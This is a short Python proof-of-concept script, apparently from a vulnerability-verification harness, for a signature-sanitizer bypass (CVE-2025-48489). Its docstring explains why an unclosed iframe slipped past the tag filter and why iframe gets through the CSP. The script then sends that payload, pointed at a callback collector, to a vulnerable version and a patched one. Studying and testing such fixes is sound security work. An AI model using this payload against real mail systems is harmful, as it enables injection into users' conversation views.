#!/usr/bin/env python3
"""[GIVEN] CVE-2025-48489 seed -- an UNCLOSED dangerous tag in the mailbox signature.

Root cause the 1.8.180 fix closed: before 1.8.180, Helper::stripDangerousTags() only removed
*paired* tags (regex `#<iframe(.*?)>(.*?)</iframe>#`), so an UNCLOSED `<iframe src=...>` with no
closing tag slipped through and rendered in the conversation view. The 1.8.180 patch added a
second pass `#<iframe(.*?)>#` that strips unclosed restricted tags too.

  V0 (1.8.179): unclosed <iframe> survives -> the victim's conversation view loads its src ->
                collector hit -> ORIGINAL executes.
  V1 (1.8.212): the 1.8.180 unclosed-tag pass strips it -> no request -> ORIGINAL blocked.

iframe (not script/img) is used because it is in stripDangerousTags' blocklist AND the app's CSP
allows frame-src * (external script is CSP-blocked; img is never sanitized). Same sink as the
residual: both land in the mailbox signature rendered by Conversation::getSignatureProcessed().
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from poc_common import run_payload, CB  # noqa: E402

# Unclosed iframe: no </iframe>. Pre-1.8.180 stripDangerousTags leaves it untouched.
ORIGINAL_PAYLOAD = '<iframe src="' + CB + '&via=iframe">'


def original_poc(*, version="v1"):
    return run_payload(ORIGINAL_PAYLOAD, version)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(original_poc(version=v))
